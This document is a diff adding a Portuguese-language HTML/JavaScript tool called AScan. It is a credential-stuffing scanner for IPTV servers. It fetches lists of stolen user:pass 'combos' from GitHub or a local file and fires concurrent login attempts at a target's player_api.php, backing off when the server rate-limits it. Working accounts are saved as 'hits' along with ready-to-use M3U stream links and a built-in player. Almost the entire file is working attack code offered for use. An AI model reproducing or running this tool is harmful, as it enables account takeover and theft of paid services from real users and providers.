@@ -1,0 +1,742 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>AScan</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #0A0C10;
+  --surface: #12151C;
+  --surface2: #1a1a26;
+  --border: #2a2a3d;
+  --text: #eeeef5;
+  --muted: #8b8ba3;
+  --violet: #22D3EE;
+  --violet-dim: rgba(168, 85, 247, 0.15);
+  --magenta: #67E8F9;
+  --lime: #84cc16;
+  --amber: #f59e0b;
+  --rose: #f43f5e;
+  --sky: #38bdf8;
+  --r: 14px;
+  --r-sm: 9px;
+  --font: 'Outfit', system-ui, sans-serif;
+  --mono: 'IBM Plex Mono', monospace;
+}
+* { box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0; }
+body {
+  font-family: var(--font);
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+  padding: 12px;
+  background-image:
+    radial-gradient(ellipse 80% 50% at 10% -10%, rgba(168,85,247,0.18), transparent),
+    radial-gradient(ellipse 60% 40% at 100% 100%, rgba(232,121,249,0.08), transparent);
+}
+.app { max-width: 720px; margin: 0 auto; }
+.top { display: flex; align-items: center; justify-content: space-between; padding: 16px 4px 20px; }
+.brand { display: flex; align-items: center; gap: 12px; }
+.logo {
+  width: 42px; height: 42px; border-radius: 12px;
+  background: linear-gradient(135deg, #22D3EE, #67E8F9);
+  display: grid; place-items: center;
+  font-weight: 800; font-size: 18px; color: #0A0C10;
+  box-shadow: 0 0 24px rgba(168,85,247,0.4);
+}
+.brand h1 {
+  font-size: 1.35rem; font-weight: 800; letter-spacing: -0.03em;
+  background: linear-gradient(90deg, #67E8F9, #22D3EE, #38bdf8);
+  -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+}
+.brand p { font-size: 0.7rem; color: var(--muted); font-weight: 500; }
+.badge {
+  font-size: 0.65rem; font-weight: 700;
+  background: var(--violet-dim); color: var(--magenta);
+  border: 1px solid rgba(168,85,247,0.35);
+  padding: 6px 12px; border-radius: 999px;
+}
+.card {
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: var(--r); padding: 16px; margin-bottom: 12px;
+}
+.card-title {
+  font-size: 0.68rem; font-weight: 700; text-transform: uppercase;
+  letter-spacing: 0.08em; color: var(--muted); margin-bottom: 12px;
+}
+.row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+.row.full { grid-template-columns: 1fr; }
+.field { display: flex; flex-direction: column; gap: 5px; }
+.field label {
+  font-size: 0.65rem; font-weight: 600; color: var(--muted);
+  text-transform: uppercase; letter-spacing: 0.05em;
+}
+.field input, .field select {
+  background: var(--surface2); border: 1px solid var(--border); color: var(--text);
+  border-radius: var(--r-sm); padding: 11px 12px;
+  font-family: var(--font); font-size: 0.9rem; font-weight: 500;
+  outline: none; transition: border-color .2s, box-shadow .2s; width: 100%;
+}
+.field input:focus, .field select:focus {
+  border-color: var(--violet); box-shadow: 0 0 0 3px var(--violet-dim);
+}
+.field input[type="file"] { padding: 8px 10px; font-size: 0.8rem; color: var(--muted); }
+.btn {
+  display: inline-flex; align-items: center; justify-content: center; gap: 6px;
+  border: none; border-radius: var(--r-sm);
+  font-family: var(--font); font-weight: 700; font-size: 0.78rem;
+  padding: 12px 14px; cursor: pointer;
+  transition: transform .12s, filter .15s, box-shadow .2s;
+  text-transform: uppercase; letter-spacing: 0.03em; width: 100%;
+}
+.btn:active { transform: scale(0.97); }
+.btn:disabled { opacity: .45; cursor: not-allowed; transform: none; }
+.btn-main {
+  background: linear-gradient(135deg, #22D3EE, #06B6D4); color: #fff;
+  box-shadow: 0 4px 20px rgba(168,85,247,0.35);
+}
+.btn-main:hover { filter: brightness(1.1); }
+.btn-online {
+  background: linear-gradient(135deg, #38bdf8, #0284c7); color: #0A0C10;
+  box-shadow: 0 4px 16px rgba(56,189,248,0.3);
+}
+.btn-ghost { background: var(--surface2); color: var(--text); border: 1px solid var(--border); }
+.btn-ghost:hover { border-color: var(--violet); }
+.btn-danger { background: linear-gradient(135deg, #f43f5e, #be123c); color: #fff; }
+.btn-lime { background: linear-gradient(135deg, #84cc16, #65a30d); color: #0A0C10; }
+.btn-amber { background: linear-gradient(135deg, #f59e0b, #d97706); color: #0A0C10; }
+.actions { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 4px; }
+.actions .span2 { grid-column: 1 / -1; }
+.combo-status { font-size: 0.72rem; margin-top: 8px; min-height: 1.2em; color: var(--muted); }
+.combo-status.ok { color: var(--lime); }
+.combo-status.err { color: var(--rose); }
+.combo-status.loading { color: var(--sky); }
+#combo-online-select.hidden { display: none !important; }
+.tabs {
+  display: flex; gap: 6px; margin: 14px 0 10px;
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: var(--r); padding: 4px;
+}
+.tab {
+  flex: 1; text-align: center; padding: 10px;
+  font-size: 0.72rem; font-weight: 700; text-transform: uppercase;
+  border-radius: var(--r-sm); cursor: pointer; color: var(--muted); transition: .2s;
+}
+.tab.active { background: var(--violet); color: #fff; box-shadow: 0 2px 12px rgba(168,85,247,0.4); }
+.log-box {
+  background: var(--surface); border: 1px solid var(--border); border-radius: var(--r);
+  min-height: 160px; max-height: 280px; overflow-y: auto; padding: 12px;
+  font-size: 0.75rem; line-height: 1.5; font-family: var(--mono);
+}
+.log-box.hidden { display: none !important; }
+.log-hit { color: var(--lime); font-weight: 600; }
+.log-error { color: var(--rose); }
+.log-info { color: var(--muted); }
+.hits-wrap { display: flex; flex-direction: column; gap: 14px; }
+.hit-group { background: var(--surface); border: 1px solid var(--border); border-radius: var(--r); overflow: hidden; }
+.hit-group-head {
+  background: var(--violet-dim); border-bottom: 1px solid var(--border);
+  padding: 10px 14px; font-size: 0.8rem; font-weight: 700; color: var(--magenta); word-break: break-all;
+}
+.hit-item { border-bottom: 1px solid var(--border); padding: 12px 14px; }
+.hit-item:last-child { border-bottom: none; }
+.hit-meta {
+  display: grid; grid-template-columns: auto 1fr; gap: 4px 10px;
+  font-size: 0.72rem; font-family: var(--mono); margin-bottom: 10px;
+}
+.hit-meta .k { color: var(--muted); }
+.hit-meta .v { color: var(--text); word-break: break-all; }
+.hit-meta .v.lime { color: var(--lime); }
+.hit-links { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 8px; }
+.hit-links button {
+  font-size: 0.65rem; font-weight: 600; padding: 5px 10px; border-radius: 6px;
+  background: var(--surface2); border: 1px solid var(--border);
+  color: var(--sky); cursor: pointer; font-family: var(--font);
+}
+.hit-raw {
+  margin-top: 8px; background: #0d0d14; border: 1px solid var(--border);
+  border-radius: 8px; padding: 10px; font-family: var(--mono);
+  font-size: 0.62rem; line-height: 1.55; white-space: pre-wrap;
+  word-break: break-all; color: #c4c4d4; max-height: 120px; overflow-y: auto;
+}
+.stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 12px; }
+.stat {
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: var(--r-sm); padding: 10px 6px; text-align: center; position: relative;
+}
+.stat span { display: block; font-size: 0.6rem; color: var(--muted); text-transform: uppercase; letter-spacing: 0.04em; margin-bottom: 2px; }
+.stat b { font-size: 0.95rem; font-weight: 700; }
+.stat.clickable { cursor: pointer; }
+.stat.clickable:hover { border-color: var(--violet); }
+#hits-count { color: var(--lime); }
+#invalidas-count { color: var(--rose); }
+#erros-count { color: var(--amber); }
+#status-text { color: var(--magenta); }
+.breakdown {
+  display: none; position: absolute; z-index: 30;
+  top: calc(100% + 6px); left: 50%; transform: translateX(-50%);
+  background: var(--bg); border: 1px solid var(--border);
+  border-radius: 10px; padding: 8px; min-width: 160px;
+  box-shadow: 0 12px 32px rgba(0,0,0,0.5); font-size: 0.68rem; text-align: left;
+}
+.breakdown.show { display: block; }
+.breakdown li {
+  list-style: none; display: flex; justify-content: space-between;
+  padding: 4px 0; border-bottom: 1px solid var(--border); gap: 8px;
+}
+.breakdown li:last-child { border-bottom: none; }
+#player-box {
+  display: none; background: var(--surface); border: 1px solid var(--border);
+  border-radius: var(--r); padding: 14px; margin-top: 12px;
+}
+#player-box h3 { text-align: center; font-size: 0.9rem; margin-bottom: 10px; }
+#video-player { width: 100%; border-radius: 10px; background: #000; border: 1px solid var(--border); }
+.player-btns { display: flex; gap: 6px; flex-wrap: wrap; margin-top: e8px; }
+.player-btns { display: flex; gap: 6px; flex-wrap: wrap; margin-top: 8px; }
+.player-btns .btn { flex: 1; min-width: 90px; font-size: 0.7rem; padding: 10px; }
+#channel-grid {
+  display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+  gap: 6px; margin-top: 10px; max-height: 240px; overflow-y: auto;
+}
+.ch-btn {
+  font-size: 0.58rem; padding: 8px 6px; background: var(--surface2);
+  border: 1px solid var(--border); color: var(--text); border-radius: 7px;
+  cursor: pointer; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-family: var(--font);
+}
+.ch-btn:hover { border-color: var(--violet); }
+.cat-title {
+  grid-column: 1 / -1; font-weight: 700; color: var(--magenta);
+  font-size: 0.75rem; padding: 6px 0; border-bottom: 1px solid var(--border);
+}
+#toast {
+  position: fixed; bottom: -80px; left: 50%; transform: translateX(-50%);
+  background: linear-gradient(135deg, #22D3EE, #06B6D4); color: #fff;
+  padding: 12px 20px; border-radius: 12px; font-weight: 600; font-size: 0.8rem;
+  z-index: 9999; box-shadow: 0 8px 28px rgba(168,85,247,0.45);
+  transition: bottom .4s cubic-bezier(.34,1.56,.64,1); max-width: 90%; text-align: center;
+}
+#toast.show { bottom: 20px; }
+.speed-line {
+  font-size: 0.72rem; color: var(--muted); margin-top: 8px;
+  display: flex; align-items: center; gap: 8px; flex-wrap: wrap;
+}
+::-webkit-scrollbar { width: 4px; }
+::-webkit-scrollbar-thumb { background: var(--violet); border-radius: 4px; }
+@media (max-width: 480px) {
+  .row { grid-template-columns: 1fr; }
+  body { padding: 8px; }
+}
+</style>
+</head>
+<body>
+<div class="app">
+  <div class="top">
+    <div class="brand">
+      <div class="logo">A</div>
+      <div>
+        <h1>AScan</h1>
+        <p>t.me/ApkBugado</p>
+      </div>
+    </div>
+    <span class="badge">TURBO</span>
+  </div>
+
+  <div class="card">
+    <div class="card-title">Configuração</div>
+    <div class="row">
+      <div class="field">
+        <label>Nickname</label>
+        <input type="text" id="nick" value="AScan">
+      </div>
+      <div class="field">
+        <label>Threads</label>
+        <input type="number" id="numBots" value="20" min="5" max="50">
+      </div>
+    </div>
+    <div class="row full" style="margin-top:10px">
+      <div class="field">
+        <label>Servidor</label>
+        <input type="text" id="servidorUnico" placeholder="http://exemplo.com">
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">Combo</div>
+    <div class="field">
+      <label>Arquivo local (.txt)</label>
+      <input type="file" id="combo" accept=".txt,text/plain">
+    </div>
+    <div style="margin-top:10px;display:flex;gap:8px;flex-wrap:wrap;">
+      <button type="button" class="btn btn-online" id="btn-combo-online" style="flex:1;min-width:140px">🌐 Usar combo online</button>
+      <select id="combo-online-select" class="hidden" style="flex:1;min-width:140px"></select>
+    </div>
+    <div class="field" style="margin-top:10px">
+      <label>Ou cole link raw direto (GitHub)</label>
+      <div style="display:flex;gap:8px;flex-wrap:wrap">
+        <input type="text" id="combo-url-manual" placeholder="https://raw.githubusercontent.com/..." style="flex:1;min-width:160px">
+        <button type="button" class="btn btn-ghost" id="btn-load-manual" style="width:auto;padding:11px 14px">Baixar</button>
+      </div>
+    </div>
+    <div id="combo-status" class="combo-status"></div>
+    <div class="speed-line">
+      <button type="button" class="btn btn-ghost" id="btn-speed-test" style="width:auto;padding:8px 12px;font-size:0.68rem">⚡ Velocidade</button>
+      <span id="speed-display">-- cred/s</span>
+    </div>
+  </div>
+
+  <div class="actions">
+    <button type="button" class="btn btn-main span2 btn-start">🚀 Iniciar scan</button>
+    <button type="button" class="btn btn-ghost btn-copy">📋 Copiar hits</button>
+    <button type="button" class="btn btn-lime" id="btn-download">⬇️ Baixar hits</button>
+    <button type="button" class="btn btn-amber" id="btn-save-per-server">💾 Por servidor</button>
+    <button type="button" class="btn btn-ghost" id="btn-open-player">🎬 Player</button>
+    <button type="button" class="btn btn-danger span2 btn-quit">⛔ Sair</button>
+  </div>
+
+  <div class="tabs">
+    <div class="tab active" data-tab="activity">Atividade</div>
+    <div class="tab" data-tab="hits">Resultados</div>
+  </div>
+
+  <div id="activityContent" class="log-box"></div>
+  <div id="hitsContent" class="log-box hidden"></div>
+
+  <div id="player-box">
+    <h3>🎬 Player</h3>
+    <video id="video-player" controls playsinline></video>
+    <div class="player-btns">
+      <button type="button" class="btn btn-ghost" id="btn-load-channels">Canais</button>
+      <button type="button" class="btn btn-ghost" id="btn-load-cartoon">Desenhos</button>
+      <button type="button" class="btn btn-danger" id="btn-close-player">Fechar</button>
+    </div>
+    <div id="channel-grid"></div>
+  </div>
+
+  <div class="stats">
+    <div class="stat"><span>Status</span><b id="status-text">Parado</b></div>
+    <div class="stat"><span>Testadas</span><b id="processed-count">0/0</b></div>
+    <div class="stat clickable" id="hits-status-item">
+      <span>Hits</span><b id="hits-count">0</b>
+      <div class="breakdown" id="hits-breakdown"></div>
+    </div>
+    <div class="stat clickable" id="invalidas-status-item">
+      <span>Inválidas</span><b id="invalidas-count">0</b>
+      <div class="breakdown" id="invalidas-breakdown"></div>
+    </div>
+    <div class="stat clickable" id="erros-status-item">
+      <span>Erros</span><b id="erros-count">0</b>
+      <div class="breakdown" id="erros-breakdown"></div>
+    </div>
+    <div class="stat"><span>Reagend.</span><b id="rescheduled-count">0</b></div>
+  </div>
+</div>
+<div id="toast"></div>
+<script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>
+<script>
+const COMBO_LIST_URL = 'https://raw.githubusercontent.com/StartStatic1/AScan-Combos/main/lista.txt';
+let state = {}, loadedComboText = null, onlineCombos = [], hlsInstance = null;
+const resetState = () => {
+  state = {
+    hitsByServer: {}, invalidsByServer: {}, errorsByServer: {}, hitsLog: {}, hitsData: {},
+    rescheduled: 0, totalCombo: 0, processedCombo: 0, isScanRunning: false, servers: [],
+    playerInfo: {}, comboLines: [], isPlayerOpen: false, startTime: 0, speed: 0
+  };
+};
+resetState();
+const $ = id => document.getElementById(id);
+const toast = msg => { const t=$('toast'); t.textContent=msg; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'),6500); };
+function formatarData(ts){ if(!ts)return'N/A'; const d=new Date(ts*1000); return `${String(d.getDate()).padStart(2,'0')}/${String(d.getMonth()+1).padStart(2,'0')}/${d.getFullYear()}`; }
+function parseComboText(texto){
+  return texto.split(/\r?\n/).map(l=>l.trim()).filter(l=>l.includes(':')&&!l.startsWith('#')).map(line=>{
+    const p=line.split(':',2); return {user:(p[0]||'').trim(),pass:(p[1]||'').trim()};
+  }).filter(c=>c.user&&c.pass);
+}
+function normalizeGithubRawUrl(url){
+  let u=(url||'').trim(); if(!u)return'';
+  const blob=u.match(/github\.com\/([^/]+)\/([^/]+)\/blob\/([^/]+)\/(.+)/i);
+  if(blob)return`https://raw.githubusercontent.com/${blob[1]}/${blob[2]}/${blob[3]}/${blob[4]}`;
+  if(/raw\.githubusercontent\.com/i.test(u))return u;
+  const gist=u.match(/gist\.github\.com\/([^/]+)\/([a-f0-9]+)/i);
+  if(gist)return`https://gist.githubusercontent.com/${gist[1]}/${gist[2]}/raw`;
+  return u;
+}
+async function fetchText(url,ms=25000){
+  const c=new AbortController(); const t=setTimeout(()=>c.abort(),ms);
+  try{ const res=await fetch(url,{signal:c.signal,cache:'no-store',headers:{Accept:'text/plain,*/*'}}); if(!res.ok)throw new Error('HTTP '+res.status); return await res.text(); }
+  finally{ clearTimeout(t); }
+}
+async function loadOnlineComboList(){
+  const sel=$('combo-online-select'), btn=$('btn-combo-online'), st=$('combo-status');
+  btn.disabled=true; st.textContent='Buscando combos online...'; st.className='combo-status loading';
+  onlineCombos=[];
+  const nameMap={}; // filename or url -> display name
+
+  // Nomes amigáveis padrão (arquivo → nome na tela)
+  const DEFAULT_NAMES={
+    'combo1.txt':'Basic',
+    'combo2.txt':'Plus',
+    'combo3.txt':'Pro',
+    'combo4.txt':'Premium',
+    'combo_basic.txt':'Basic',
+    'combo_plus.txt':'Plus',
+    'combo_pro.txt':'Pro',
+    'combo_premium.txt':'Premium'
+  };
+
+  function prettyName(filename, url){
+    const f=(filename||'').toLowerCase();
+    if(DEFAULT_NAMES[f]) return DEFAULT_NAMES[f];
+    if(nameMap[f]) return nameMap[f];
+    if(url && nameMap[url]) return nameMap[url];
+    // combo1 → Combo 1  |  remove .txt
+    let n=(filename||url||'Combo').replace(/\.txt$/i,'');
+    n=n.replace(/^combo[_-]?/i,'');
+    if(/^\d+$/.test(n)) return 'Servidor '+n;
+    if(!n) return 'Servidor';
+    return n.charAt(0).toUpperCase()+n.slice(1);
+  }
+
+  try{
+    // lista.txt: Nome|URL  (prioridade para nomes custom)
+    try{
+      const texto=await fetchText(normalizeGithubRawUrl(COMBO_LIST_URL), 10000);
+      texto.split(/\r?\n/).map(l=>l.trim()).filter(l=>l&&!l.startsWith('#')).forEach(line=>{
+        if(line.includes('|')){
+          const[name,u]=line.split('|').map(s=>s.trim());
+          if(u){
+            const url=normalizeGithubRawUrl(u);
+            const file=(url.split('/').pop()||'').toLowerCase();
+            nameMap[file]=name; nameMap[url]=name;
+            onlineCombos.push({name:name,url:url});
+          }
+        }
+      });
+    }catch(_e){}
+
+    // API: arquivos reais do repo
+    try{
+      const api='https://api.github.com/repos/StartStatic1/AScan-Combos/contents/';
+      const res=await fetch(api,{cache:'no-store',headers:{Accept:'application/vnd.github+json'}});
+      if(res.ok){
+        const files=await res.json();
+        if(Array.isArray(files)){
+          files.forEach(f=>{
+            if(!f||f.type!=='file'||!/\.txt$/i.test(f.name||'')||f.name.toLowerCase()==='lista.txt'||!f.download_url) return;
+            const url=f.download_url;
+            const already=onlineCombos.some(c=>c.url===url);
+            if(already){
+              // só atualiza nome se lista não definiu
+              const idx=onlineCombos.findIndex(c=>c.url===url);
+              if(idx>=0 && !nameMap[url] && !nameMap[f.name.toLowerCase()]){
+                onlineCombos[idx].name=prettyName(f.name,url);
+              }
+            } else {
+              onlineCombos.push({name:prettyName(f.name,url),url:url});
+            }
+          });
+        }
+      }
+    }catch(_e){}
+
+    // dedupe por URL
+    const seen=new Set();
+    onlineCombos=onlineCombos.filter(c=>{
+      const k=(c.url||'').toLowerCase();
+      if(!k||seen.has(k)) return false;
+      seen.add(k); return true;
+    });
+
+    if(!onlineCombos.length) throw new Error('Nenhum combo online encontrado');
+
+    sel.innerHTML='<option value="">Selecione...</option>';
+    onlineCombos.forEach((c,i)=>{
+      const o=document.createElement('option');
+      o.value=String(i);
+      o.textContent=c.name;
+      sel.appendChild(o);
+    });
+    sel.classList.remove('hidden');
+    st.textContent='✅ '+onlineCombos.length+' combo(s) — escolha no menu';
+    st.className='combo-status ok';
+    toast(onlineCombos.length+' combo(s) online');
+    if(onlineCombos.length===1){ sel.value='0'; await loadSelectedOnlineCombo(); }
+  }catch(e){
+    onlineCombos=[]; sel.classList.add('hidden');
+    st.textContent='❌ '+(e.name==='AbortError'?'Timeout':(e.message||'Erro'));
+    st.className='combo-status err';
+  }finally{ btn.disabled=false; }
+}
+async function loadSelectedOnlineCombo(){
+  const sel=$('combo-online-select'), st=$('combo-status'), idx=sel.value;
+  if(idx===''||!onlineCombos[idx]){ loadedComboText=null; return null; }
+  const item=onlineCombos[idx];
+  st.textContent=`Carregando "${item.name}"...`; st.className='combo-status loading';
+  try{
+    const texto=await fetchText(item.url); const lines=parseComboText(texto);
+    if(!lines.length) throw new Error('Sem credenciais user:pass');
+    loadedComboText=texto; $('combo').value='';
+    st.textContent=`✅ ${item.name} — ${lines.length.toLocaleString('pt-BR')} credenciais`; st.className='combo-status ok';
+    toast('Combo: '+lines.length+' linhas'); return texto;
+  }catch(e){ loadedComboText=null; st.textContent='❌ '+(e.message||'Erro'); st.className='combo-status err'; return null; }
+}
+async function getComboText(){
+  const f=$('combo').files[0]; if(f){ loadedComboText=null; return await f.text(); }
+  if(loadedComboText) return loadedComboText; return null;
+}
+function updateStatusBar(){
+  const inv=Object.values(state.invalidsByServer).reduce((a,b)=>a+b,0);
+  const err=Object.values(state.errorsByServer).reduce((a,b)=>a+b,0);
+  const hits=Object.values(state.hitsByServer).reduce((a,b)=>a+b,0);
+  $('processed-count').textContent=`${state.processedCombo}/${state.totalCombo}`;
+  $('hits-count').textContent=hits; $('invalidas-count').textContent=inv; $('erros-count').textContent=err;
+  $('rescheduled-count').textContent=state.rescheduled;
+  renderBreakdown(state.hitsByServer,$('hits-breakdown'));
+  renderBreakdown(state.invalidsByServer,$('invalidas-breakdown'));
+  renderBreakdown(state.errorsByServer,$('erros-breakdown'));
+  if(state.isScanRunning&&state.startTime){ const el=(Date.now()-state.startTime)/1000; if(el>1){ state.speed=state.processedCombo/el; $('speed-display').textContent=state.speed.toFixed(1)+' cred/s'; } }
+}
+function renderBreakdown(data,el){
+  el.innerHTML=''; const keys=Object.keys(data);
+  if(!keys.length){ el.innerHTML='<li><span>Nenhum</span></li>'; return; }
+  const ul=document.createElement('ul'); ul.style.cssText='padding:0;margin:0';
+  keys.forEach(url=>{ const li=document.createElement('li'); let host=url; try{host=new URL(url).hostname;}catch(e){} li.innerHTML=`<span style="color:var(--muted)">${host}</span><b>${data[url]}</b>`; ul.appendChild(li); });
+  el.appendChild(ul);
+}
+function logActivity(msg,type='info'){
+  const d=document.createElement('div'); d.className=type==='hit'?'log-hit':type==='error'?'log-error':'log-info'; d.textContent=msg;
+  const box=$('activityContent'); const bottom=box.scrollHeight-box.clientHeight<=box.scrollTop+12;
+  box.appendChild(d); if(bottom) box.scrollTop=box.scrollHeight;
+}
+async function testarNoServidor(cred,servidor){
+  const{user,pass}=cred,{url}=servidor;
+  try{
+    const c=new AbortController(); const t=setTimeout(()=>c.abort(),8000);
+    const res=await fetch(`${url}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`,{signal:c.signal,cache:'no-store'});
+    clearTimeout(t); if(!state.isScanRunning) return{status:'stopped'};
+    if(res.status===429||res.status===403) return{status:'error',errorType:'block'};
+    if(res.status!==200) return{status:'invalida'};
+    let data; try{data=JSON.parse(await res.text());}catch(e){return{status:'invalida'};}
+    if(!data.user_info) return{status:'invalida'};
+    if(String(data.user_info.status||'').toLowerCase()==='active') return{status:'hit',data};
+    return{status:'invalida'};
+  }catch(e){ if(e.name==='AbortError') return{status:'error',errorType:'timeout'}; return{status:'error',errorType:'connection'}; }
+}
+function buildHitObject(cred,serverUrl,data){
+  const info=data.user_info||{};
+  const expDate=info.exp_date?formatarData(info.exp_date):'N/A';
+  const createDate=info.created_at?formatarData(info.created_at):'N/A';
+  let dias='N/A'; if(info.exp_date){ const diff=info.exp_date-Math.floor(Date.now()/1000); dias=diff>0?Math.floor(diff/86400)+' dias':'Expirado'; }
+  const plano=info.plano||info.plan||info.package||'PREMIUM';
+  const conexoes=info.active_connections!==undefined?`${info.active_connections}/${info.max_connections||1}`:'1/1';
+  const m3u=`${serverUrl}/get.php?username=${cred.user}&password=${cred.pass}&type=m3u_plus&output=ts`;
+  const epg=`${serverUrl}/xmltv.php?username=${cred.user}&password=${cred.pass}`;
+  const raw=`╔══════════════════════════════════════╗
+║  ⚡ AScan  |  t.me/ApkBugado         ║
+╠══════════════════════════════════════╣
+║ 📡 Servidor  → ${serverUrl}
+║ 👤 Usuário   → ${cred.user}
+║ 🔐 Senha     → ${cred.pass}
+║ ✅ Status    → Online
+║ 💎 Plano     → ${plano}
+║ 📶 Conexões  → ${conexoes}
+║ 📅 Criado    → ${createDate}
+║ 📅 Expira    → ${expDate}
+║ ⏳ Restam    → ${dias}
+╠══════════════════════════════════════╣
+║ 📎 M3U → ${m3u}
+║ 📺 EPG → ${epg}
+╚══════════════════════════════════════╝`;
+  return{server:serverUrl,user:cred.user,pass:cred.pass,plano,conexoes,createDate,expDate,dias,m3u,epg,raw};
+}
+async function processarCredencial(cred){
+  const avail=state.servers.filter(s=>!s.blocked&&Date.now()>s.coolDownUntil);
+  if(!avail.length){ state.rescheduled++; state.comboLines.push(cred); updateStatusBar(); return; }
+  const servidor=avail[0]; const r=await testarNoServidor(cred,servidor); if(!state.isScanRunning) return;
+  if(r.status==='hit'){
+    state.hitsByServer[servidor.url]=(state.hitsByServer[servidor.url]||0)+1;
+    const obj=buildHitObject(cred,servidor.url,r.data);
+    if(!state.hitsLog[servidor.url]) state.hitsLog[servidor.url]=[];
+    if(!state.hitsData[servidor.url]) state.hitsData[servidor.url]=[];
+    state.hitsLog[servidor.url].push(obj.raw); state.hitsData[servidor.url].push(obj);
+    state.playerInfo={server:servidor.url,user:cred.user,pass:cred.pass};
+    let host=servidor.url; try{host=new URL(servidor.url).hostname;}catch(e){}
+    logActivity(`[HIT] (${host}) ${cred.user}:${cred.pass}`,'hit'); try{playBeep();}catch(e){} renderHits();
+  } else if(r.status==='invalida'){ state.invalidsByServer[servidor.url]=(state.invalidsByServer[servidor.url]||0)+1; }
+  else if(r.status==='error'){
+    state.errorsByServer[servidor.url]=(state.errorsByServer[servidor.url]||0)+1;
+    if(r.errorType==='block'){ servidor.blockRetries=(servidor.blockRetries||0)+1; if(servidor.blockRetries>=2){ servidor.blocked=true; toast('Servidor bloqueado'); } }
+    else servidor.coolDownUntil=Date.now()+5000;
+  }
+  state.processedCombo++; updateStatusBar();
+}
+function playBeep(){
+  try{ const ctx=new(window.AudioContext||window.webkitAudioContext)(); const o=ctx.createOscillator(); const g=ctx.createGain();
+    o.connect(g); g.connect(ctx.destination); o.type='square';
+    o.frequency.setValueAtTime(1100,ctx.currentTime); o.frequency.exponentialRampToValueAtTime(700,ctx.currentTime+0.06);
+    g.gain.setValueAtTime(0.2,ctx.currentTime); g.gain.exponentialRampToValueAtTime(0.01,ctx.currentTime+0.08);
+    o.start(); o.stop(ctx.currentTime+0.08); }catch(e){}
+}
+async function workerTurbo(){
+  while(state.comboLines.length>0&&state.isScanRunning){
+    const ok=state.servers.some(s=>!s.blocked&&Date.now()>s.coolDownUntil);
+    if(!ok&&state.servers.length){ await new Promise(r=>setTimeout(r,1000)); updateStatusBar(); continue; }
+    const batch=state.comboLines.splice(0,Math.min(5,state.comboLines.length));
+    await Promise.all(batch.map(c=>processarCredencial(c))); await new Promise(r=>setTimeout(r,0));
+  }
+}
+async function startAttack(){
+  if(state.isScanRunning){ state.isScanRunning=false; $('status-text').textContent='Parando...'; document.querySelector('.btn-start').textContent='🚀 Iniciar scan'; return; }
+  const servidorInput=$('servidorUnico').value.trim(); if(!servidorInput) return alert('Preencha o servidor!');
+  const texto=await getComboText(); if(!texto) return alert('Selecione um arquivo .txt ou use "Usar combo online"!');
+  resetState(); state.isScanRunning=true; state.startTime=Date.now();
+  document.querySelector('.btn-start').textContent='⏹ Parar scan'; $('status-text').textContent='Rodando';
+  $('activityContent').innerHTML=''; $('hitsContent').innerHTML='';
+  let url=servidorInput; if(!url.startsWith('http')) url='http://'+url;
+  state.servers=[{url:url.replace(/\/$/,''),blockRetries:0,blocked:false,coolDownUntil:0}];
+  state.comboLines=parseComboText(texto); state.totalCombo=state.comboLines.length;
+  if(!state.totalCombo){ alert('Nenhuma credencial válida!'); state.isScanRunning=false; document.querySelector('.btn-start').textContent='🚀 Iniciar scan'; $('status-text').textContent='Parado'; return; }
+  updateStatusBar(); renderHits();
+  const num=Math.min(parseInt($('numBots').value,10)||20,state.totalCombo,30);
+  toast(`Iniciando ${num} workers`); logActivity(`Combo: ${state.totalCombo} | Workers: ${num}`,'info');
+  await Promise.all(Array.from({length:num},workerTurbo));
+  if(state.isScanRunning){ $('status-text').textContent='Finalizado'; const el=(Date.now()-state.startTime)/1000; const hits=Object.values(state.hitsByServer).reduce((a,b)=>a+b,0); toast(`✅ ${hits} hits · ${(state.processedCombo/Math.max(el,0.1)).toFixed(1)} cred/s`); }
+  else $('status-text').textContent='Parado';
+  document.querySelector('.btn-start').textContent='🚀 Iniciar scan'; state.isScanRunning=false;
+}
+function getAllRaws(){ const all=[]; for(const s in state.hitsLog) all.push(...state.hitsLog[s]); return all; }
+function copiarHits(){ const h=getAllRaws(); if(!h.length) return alert('Nenhum hit.'); navigator.clipboard.writeText(h.join('\n\n')).then(()=>alert('Hits copiados!')); }
+function downloadHits(){ const h=getAllRaws(); if(!h.length) return alert('Nenhum hit.'); const blob=new Blob(['\uFEFF'+h.join('\n\n')],{type:'text/plain;charset=utf-8'}); const a=document.createElement('a'); a.href=URL.createObjectURL(blob); a.download=`hits_AScan_${new Date().toISOString().slice(0,10)}.txt`; a.click(); URL.revokeObjectURL(a.href); }
+function salvarPorServidor(){
+  const servers=Object.keys(state.hitsLog); if(!servers.length) return alert('Nenhum hit.');
+  const nick=$('nick').value||'AScan'; const date=new Date().toISOString().slice(0,10);
+  servers.forEach(su=>{ let host=su; try{host=new URL(su).hostname;}catch(e){} host=host.replace(/[^a-zA-Z0-9]/g,'_');
+    const blob=new Blob(['\uFEFF'+state.hitsLog[su].join('\n\n')],{type:'text/plain;charset=utf-8'});
+    const a=document.createElement('a'); a.href=URL.createObjectURL(blob); a.download=`${nick}_${host}_${date}.txt`; a.click(); URL.revokeObjectURL(a.href);
+  }); toast(servers.length+' arquivo(s) salvos');
+}
